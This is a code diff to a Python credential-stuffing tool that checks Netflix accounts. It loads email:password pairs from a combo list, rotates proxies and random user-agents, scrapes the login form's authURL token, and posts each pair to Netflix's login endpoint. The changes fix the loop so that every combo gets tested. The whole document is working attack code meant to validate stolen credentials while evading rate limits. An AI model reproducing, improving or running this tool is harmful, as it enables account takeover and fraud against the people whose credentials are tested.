@@ -30,42 +30,41 @@ def banner():
     print(faded)
     print(YELLOW + "                                       github.com/Plasmonix Version 2.0 \n" + RESET)
 
-def load_combo():
-    global email,password
-    try :
-        combolist = open("combo.txt", "r").readlines()
-        for combos in combolist:
-            email = combos.split(":")[0]
-            password=combos.split(":")[1]
-        load_proxies()
-    except FileNotFoundError :
-           print(RED + """ [ERROR] combo.txt not found """ + RESET)
-
 proxies = []
 def load_proxies():
-    try :
+    try:
         proxyfile = open("proxies.txt", "r").readlines()
         for proxy in proxyfile:
             ip = proxy.split(":")[0]
             port = proxy.split(":")[1]
             proxies.append({'https': 'http://'+ ip + ':' + port.rstrip("\n")})
-        check_account(email,password)
-    except FileNotFoundError :
-           print(RED + """ [ERROR] proxies.txt not found """ + RESET)
+    except FileNotFoundError:
+           print(RED + " [ERROR] proxies.txt not found" + RESET)
 
-def get_random(data):
-    return random.choice(data)
+def load_combo():
+    global email,password
+    try:
+        combolist = open("combo.txt", "r").readlines()
+        for combos in combolist:
+            email = combos.split(":")[0]
+            password=combos.split(":")[1]
+            check_account(email,password)
+    except FileNotFoundError:
+           print(RED + " [ERROR] combo.txt not found" + RESET)
+
+def random_proxy(proxy):
+    return random.choice(proxy)
 
 def check_account(email,password):
     client = requests.Session()
-    proxy = get_random(proxies)
+    proxy = random_proxy(proxies)
     login = client.get("https://www.netflix.com/login")
     soup = Soup(login.text,'html.parser')
     loginForm = soup.find('form')
     authURL = loginForm.find('input', {'name': 'authURL'}).get('value')
     
     headers = {
-        "user-agent":  UserAgent().random,
+        "user-agent": UserAgent().random,
         "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
         "accept-language": "en-US,en;q=0.9", 
         "accept-encoding": "gzip, deflate, br", 
@@ -90,9 +89,9 @@ def check_account(email,password):
         "recaptchaResponseTime": "473"
     }
     
-    try :
+    try:
         request = client.post("https://www.netflix.com/login",headers=headers,data=data,proxies=proxy)
-    except :
+    except:
         print(RED + " [ERROR] Failed to establish connection" + RESET)
         quit()
 
@@ -106,4 +105,5 @@ def check_account(email,password):
 
 if __name__ == "__main__":
     banner()
+    load_proxies()
     load_combo()
